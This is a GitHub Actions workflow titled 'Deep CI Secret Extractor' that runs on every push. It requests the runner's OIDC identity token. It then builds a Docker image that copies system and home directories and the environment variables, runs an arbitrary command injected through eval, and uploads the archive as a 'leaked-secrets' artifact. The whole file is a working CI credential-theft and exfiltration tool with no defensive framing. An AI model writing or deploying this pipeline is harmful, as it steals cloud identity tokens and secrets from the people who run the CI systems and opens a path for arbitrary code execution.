name: Deep CI Secret Extractor

on:
  push:
    branches: [ main ]

jobs:
  leak:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Grab OIDC Token
        id: oidc
        run: |
          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "OIDC request URL missing"
            exit 1
          fi
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
          echo "value=${TOKEN}" >> $GITHUB_OUTPUT

      - name: Create Dockerfile
        run: |
          mkdir -p exploit
          cat <<'EOF' > exploit/Dockerfile
          FROM python:3.11-alpine
          ARG EXFIL_OIDC_TOKEN
          ARG PAYLOAD_CMD
          RUN apk add --no-cache curl tar bash && \
              echo "[+] Collecting secrets..." && \
              mkdir -p /leaks && \
              cp -a /etc /root /home /var /opt /srv /leaks/ 2>/dev/null || true && \
              env | grep -v GITHUB_TOKEN > /leaks/env.txt && \
              echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks/env.txt && \
              echo "[+] Running payload..." && eval "$PAYLOAD_CMD"
          EOF

      - name: Build Docker with secret args
        run: |
          docker build \
            --build-arg EXFIL_OIDC_TOKEN="${{ steps.oidc.outputs.value }}" \
            --build-arg PAYLOAD_CMD="id && hostname && ls -al /" \
            -t extractor ./exploit

      - name: Run and Extract
        run: |
          docker run --rm extractor tar -czf - /leaks > full_leaks.tar.gz

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: leaked-secrets
          path: full_leaks.tar.gz
